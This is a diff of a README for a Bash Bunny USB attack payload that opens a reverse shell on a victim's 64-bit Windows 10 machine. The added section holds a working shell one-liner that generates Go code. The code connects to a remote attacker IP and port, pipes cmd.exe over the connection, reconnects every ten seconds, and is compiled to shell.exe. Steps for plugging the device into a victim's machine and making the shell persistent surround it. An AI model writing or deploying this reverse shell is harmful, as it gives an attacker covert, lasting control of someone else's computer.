@@ -1,11 +1,11 @@
-# Windows Persistent Reverse Shell for Bash Bunny
+# Windows Reverse Shell for Bash Bunny using Golang
 
-* Author: 0dyss3us (KeenanV) ** modified by heywoodlh
-* Version: 1.4
+* Author: heywoodlh
+* Version: 1.5
 
 ## Description
 
-Opens a reverse shell through Netcat on victim's Windows machine and connects it back to host attacker.
+Opens a reverse shell using a compiled binary on staging machine and connects Windows victim machine back to remote attacking machine.
 * Targets 64 bit Windows 10
 * Deploys in roughly 15-20 seconds
 * If desired, the reverse shell can be persistent
@@ -13,6 +13,7 @@ Opens a reverse shell through Netcat on victim's Windows machine and connects it
 ## Requirements
 
 - Have a working Bash Bunny
+- Have Golang installed on your staging machine
 
 ## STATUS
 
@@ -28,8 +29,24 @@ Opens a reverse shell through Netcat on victim's Windows machine and connects it
 
 1. Plug in Bash Bunny in arming mode
 2. Move files from WindowsReverseShell to either switch folder
-3. Edit the `run.ps1` file: edit the `$remoteServerIP`, `$remoteServerPort`, `$persistence` and `$volumeName` variables as desired
-4. Unplug Bash Bunny and switch it to the position the payload is loaded on
+3. Create a binary for the reverse shell
+
+This example assumes the staging machine is a Unix/Unix-like machine with Golang installed and using a POSIX shell:
+
+```bash
+remote_ip="127.0.0.1"
+remote_port="1337"
+
+
+echo "package main;import \"time\";import\"os/exec\";import\"net\";func connect(){c,_:=net.Dial(\"tcp\",\"${remote_ip}:${remote_port}\");cmd:=exec.Command(\"cmd.exe\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}; func main(){for {connect();time.Sleep(10 * time.Second)}}" > /tmp/t.go &&\
+	GOOS="windows" go build -o /tmp/shell.exe /tmp/t.go &&\
+	rm /tmp/t.go
+```
+
+Then copy the resulting `/tmp/shell.exe` file to the switch folder on the Bash Bunny.
+
+4. Edit the `run.ps1` file: edit the `$persistence` and `$volumeName` variables as desired
+5. Unplug Bash Bunny and switch it to the position the payload is loaded on
 
 ### Attack:
 1. Plug the Bash Bunny into your victim's Windows machine and wait until the final light turns green (about 15-20 seconds)
@@ -40,7 +57,6 @@ Opens a reverse shell through Netcat on victim's Windows machine and connects it
 
 Notes: 
 - If you set `$persistence` to 'True' in `run.ps1` then the script should always be running anytime the user is logged into their machine.
-- The script should execute every minute so if it takes longer than a minute to connect then something is wrong.
 
 ## Discussion
 
